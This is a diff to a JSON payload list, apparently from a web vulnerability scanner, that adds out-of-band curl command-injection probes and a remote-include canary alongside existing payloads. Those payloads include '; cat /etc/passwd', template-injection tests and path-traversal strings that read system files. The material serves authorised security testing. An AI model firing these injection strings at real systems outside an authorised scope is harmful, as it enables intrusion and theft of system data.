@@ -29,7 +29,9 @@
       { "id": "rce_passwd_cat", "value": "; cat /etc/passwd", "detects": ["unix_passwd_entry"] },
       { "id": "rce_ssti_jinja", "value": "{{7*7}}", "detects": [], "notes": "reflected 49 = SSTI; verify arithmetic result in probe body" },
       { "id": "rce_ssti_spring", "value": "${7*7}", "detects": [], "notes": "Spring/EL or JS template engines" },
-      { "id": "rce_ssti_eruby", "value": "<%= 7*7 %>", "detects": [], "notes": "ERB/eRuby engines" }
+      { "id": "rce_ssti_eruby", "value": "<%= 7*7 %>", "detects": [], "notes": "ERB/eRuby engines" },
+      { "id": "rce_oob_curl_semicolon", "value": "; curl {canary}", "detects": [], "notes": "OOB confirmation lands on the canary console; canary origin must be in the scope allowlist" },
+      { "id": "rce_oob_curl_subst", "value": "$(curl {canary})", "detects": [] }
     ],
     "lfi": [
       { "id": "lfi_passwd_dotslash", "value": "....//....//....//....//etc/passwd", "detects": ["unix_passwd_entry"], "notes": "bypasses naive '../' stripping" },
@@ -40,7 +42,8 @@
       { "id": "lfi_proc_version", "value": "/proc/self/version", "detects": ["uname_banner"] },
       { "id": "lfi_proc_cmdline", "value": "/proc/self/cmdline", "detects": [], "notes": "running command line leaks app runtime paths" },
       { "id": "lfi_hostname", "value": "../../../../../etc/hostname", "detects": [], "notes": "benign read proving arbitrary path control" },
-      { "id": "lfi_win_ini", "value": "../../../../../../windows/win.ini", "detects": [], "notes": "Windows targets; check [fonts]/[extensions] sections" }
+      { "id": "lfi_win_ini", "value": "../../../../../../windows/win.ini", "detects": [], "notes": "Windows targets; check [fonts]/[extensions] sections" },
+      { "id": "lfi_rfi_include_canary", "value": "{canary}", "detects": [], "notes": "include of remote canary = allow_url_include / RFI proven; callback on canary console" }
     ],
     "ssrf": [
       { "id": "ssrf_canary_token_query", "value": "{canary}?{token}", "detects": [], "notes": "token in query distinguishes this probe from ssrf_canary_path (token in path)" },
